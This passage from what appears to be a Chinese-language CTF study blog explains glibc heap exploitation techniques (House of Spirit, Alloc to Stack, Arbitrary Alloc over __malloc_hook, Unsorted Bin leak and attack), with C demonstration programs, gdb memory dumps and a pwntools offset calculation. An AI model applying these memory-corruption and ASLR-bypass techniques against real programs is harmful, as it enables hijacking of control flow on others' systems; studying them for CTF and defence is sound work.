class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">➜  how2heap git:(master) ./house_of_spirit<br>This file demonstrates the house of spirit attack.<br>Calling malloc() once so that it sets up its memory.<br>We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.<br>This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.<br>This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.<br>... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.<br>The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.<br>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.<br>... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.<br>Freeing the overwritten pointer.<br>Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!<br>malloc(0x30): 0x7ffd9bceaa60<br></code></pre></div></td></tr></table></figure><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。还能怎样绕过呢? 暂时只知道上面的方法, 有待补充.</p><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>前文所讲的 Fastbin Double Free 与 house of spirit 技术和本节所讲的Alloc to Stack，它们的本质都在于 fastbin 链表的特性：<strong>当前 chunk 的 fd 指针指向下一个 chunk。</strong> </p><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p><h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h3><p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> pre_size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fd;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    CHUNK stack_chunk;<br><br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    stack_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//0x10是user date, chunk1指向的是fd指针</span><br><br>    <span class="hljs-built_in">free</span>(chunk1); <span class="hljs-comment">//free chunk1之后fastbin中只有这一个chunk, fd指向NULL, </span><br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=&amp;stack_chunk; <span class="hljs-comment">//修改为8字节的指针, 将fd指针赋值为stack_chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//将chunk1取出</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//malloc出了一个fack_chunk(stack_chunk), 这样我们就可以修改栈上的数据了</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1<br>0x602010:   0x00007fffffffde60  0x0000000000000000<br>0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk<br></code></pre></div></td></tr></table></figure><p>之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000 &lt;=== unsorted bin<br>0x7ffff7dd1b28 &lt;main_arena+8&gt;:  0x00007fffffffde60 &lt;=== fastbin[0]<br>0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000<br></code></pre></div></td></tr></table></figure><p>最终第二次 malloc 返回值为 0x00007fffffffde70 也就是 stack_chunk</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;<br> → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax<br><span class="hljs-meta">   $</span><span class="bash">rax   : 0x00007fffffffde70</span><br><br>0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst<br>0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst<br>0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst<br>0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]<br>0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-<br>0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-<br>0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-<br>0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]<br>0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]<br>0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-<br>0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]<br>0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]<br></code></pre></div></td></tr></table></figure><h3 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h3><p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 <strong>bss、heap、data、stack</strong> 等等。</p><h3 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h3><p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到**_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。** </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=<span class="hljs-number">0x7ffff7dd1af5</span><span class="hljs-number">-0x8</span>;<span class="hljs-comment">//1ad5是malloc_hook的位置, 由于fd指针指向的是chunk的开头, </span><br>    <span class="hljs-comment">//所以要覆盖malloc_hook要往前8字节使其成为user date</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>); <span class="hljs-comment">//malloc出temp</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>); <span class="hljs-comment">//往这个指针里面写内容就可以改写malloc_hook</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里的 <strong>0x7ffff7dd1af5</strong> 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以<strong>字节错位</strong>的情况。</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br>0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0<br></code></pre></div></td></tr></table></figure><p>0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//这里的size指用户区域，因此会小于2倍SIZE_SZ</span><br>Fastbins[idx=<span class="hljs-number">0</span>, size=<span class="hljs-number">0x10</span>]<br>Fastbins[idx=<span class="hljs-number">1</span>, size=<span class="hljs-number">0x20</span>]<br>Fastbins[idx=<span class="hljs-number">2</span>, size=<span class="hljs-number">0x30</span>]<br>Fastbins[idx=<span class="hljs-number">3</span>, size=<span class="hljs-number">0x40</span>]<br>Fastbins[idx=<span class="hljs-number">4</span>, size=<span class="hljs-number">0x50</span>]<br>Fastbins[idx=<span class="hljs-number">5</span>, size=<span class="hljs-number">0x60</span>]<br>Fastbins[idx=<span class="hljs-number">6</span>, size=<span class="hljs-number">0x70</span>]<br></code></pre></div></td></tr></table></figure><p>通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0<br>0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0<br><br>0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f<br></code></pre></div></td></tr></table></figure><p>因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> fastbin_index(sz)                                                      \</span><br><span class="hljs-meta">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></code></pre></div></td></tr></table></figure><p>（注意 sz 的大小是 unsigned int，因此只占 4 个字节）</p><p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 __malloc_hook 的内容 (在我的 libc 中__realloc_hook 与__malloc_hook 是在连在一起的)。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;<br> →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax<br><span class="hljs-meta"></span><br><span class="hljs-meta"> $</span><span class="bash">rax   : 0x7ffff7dd1afd</span><br><br>0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f<br>0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f<br>0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000<br>0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000<br></code></pre></div></td></tr></table></figure><h3 id="小总结-2"><a href="#小总结-2" class="headerlink" title="小总结"></a>小总结</h3><p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p><h2 id="具体题目遇到再说"><a href="#具体题目遇到再说" class="headerlink" title="具体题目遇到再说"></a>具体题目遇到再说</h2><h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。</p><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p><p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><p><strong>基本来源</strong> </p><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li></ol><h2 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h2><h3 id="Leak-原理"><a href="#Leak-原理" class="headerlink" title="Leak 原理"></a>Leak 原理</h3><p>如果我们可以把正确的 <code>fd</code> 指针 leak 出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过调试得出。而<code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc</code> 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上，那么如果我们有进程所使用的 <code>libc</code> 的 <code>.so</code> 文件的话，我们就可以获得 <code>main_arena</code> 与 <code>libc</code> 基地址的偏移，实现对 <code>ASLR</code> 的绕过。</p><p>那么如何取得 <code>main_arena</code> 与 <code>libc</code> 基址的偏移呢？这里提供两种思路。</p><ol><li><strong>__malloc_trim 函数得出</strong> </li></ol><p>在 <code>malloc.c</code> 中有这样一段代码</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>__malloc_trim (<span class="hljs-keyword">size_t</span> s)<br>&#123;<br>  <span class="hljs-keyword">int</span> result = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (__malloc_initialized &lt; <span class="hljs-number">0</span>)<br>    ptmalloc_init ();<br><br>  mstate ar_ptr = &amp;main_arena;<span class="hljs-comment">//&lt;=here!</span><br>  <span class="hljs-keyword">do</span><br>    &#123;<br>      __libc_lock_lock (ar_ptr-&gt;mutex);<br>      result |= mtrim (ar_ptr, s);<br>      __libc_lock_unlock (ar_ptr-&gt;mutex);<br><br>      ar_ptr = ar_ptr-&gt;next;<br>    &#125;<br>  <span class="hljs-keyword">while</span> (ar_ptr != &amp;main_arena);<br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>注意到 <code>mstate ar_ptr = &amp;main_arena;</code> 这里对 <code>main_arena</code> 进行了访问，所以我们就可以通过 IDA 等工具分析出偏移了。</p><p>比如把 <code>.so</code> 文件放到 IDA 中，找到 <code>malloc_trim</code> 函数，就可以获得偏移了。</p><ol start="2"><li><strong>__malloc_hook 直接算出</strong> </li></ol><p>比较巧合的是，<code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址，这样可以大幅减小工作量。以 pwntools 为例</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">main_arena_offset = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br></code></pre></div></td></tr></table></figure><p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p><h3 id="实现-Leak-的方法"><a href="#实现-Leak-的方法" class="headerlink" title="实现 Leak 的方法"></a>实现 Leak 的方法</h3><p>一般来说，要实现 leak，需要有 <code>UAF</code>，将一个 <code>chunk</code> 放入 <code>Unsorted Bin</code> 中后再打出其 <code>fd</code>。一般的笔记管理题都会有 <code>show</code> 的功能，对处于链表尾的节点 <code>show</code> 就可以获得 <code>libc</code> 的基地址了。</p><p>特别的，<code>CTF</code> 中的利用，堆往往是刚刚初始化的，所以 <code>Unsorted Bin</code> 一般都是干净的，当里面只存在一个 <code>bin</code> 的时候，该 <code>bin</code> 的 <code>fd</code> 和 <code>bk</code> 都会指向 <code>main_arena</code> 中。</p><p>另外，如果我们无法做到访问链表尾，但是可以访问链表头，那么在 32 位的环境下，对链表头进行 <code>printf</code> 等往往可以把 <code>fd</code> 和 <code>bk</code> 一起输出出来，这个时候同样可以实现有效的 leak。</p><p>然而在 64 位下，由于高地址往往为 <code>\x00</code>，很多输出函数会被截断，这个时候可能就难以实现有效 leak。</p><h2 id="Unsorted-Bin-Attack-原理"><a href="#Unsorted-Bin-Attack-原理" class="headerlink" title="Unsorted Bin Attack 原理"></a>Unsorted Bin Attack 原理</h2><p>在 <a href="https://code.woboq.org/userspace/glibc/">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/">malloc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">malloc.c</a> 中的 <code>_int_malloc</code> 有这么一段代码，当将一个 unsorted  bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></div></td></tr></table></figure><p>换而言之，如果我们控制了 <code>bk</code> 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。</p><blockquote><p>注意!!!这种检查从2.28版本开始, 本篇部分2.27已修改为2.28版本, 更新的有待更新</p></blockquote><p>这里我以 shellphish 的 how2heap 仓库中的 <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c">unsorted_bin_attack.c</a> 为例进行介绍，这里我做一些简单的修改，如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span><br>                  <span class="hljs-string">&quot;unsigned long value into stack\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<br>      <span class="hljs-built_in">stderr</span>,<br>      <span class="hljs-string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span><br>      <span class="hljs-string">&quot;attacks, such as rewriting the &quot;</span><br>      <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> target_var = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>          <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);<br><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,<br>          p);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another normal chunk in order to avoid &quot;</span><br>                  <span class="hljs-string">&quot;consolidating the top chunk with&quot;</span><br>                  <span class="hljs-string">&quot;the first one during the free()\n\n&quot;</span>);<br>  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>  <span class="hljs-built_in">free</span>(p);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first chunk now and it will be inserted in the &quot;</span><br>                  <span 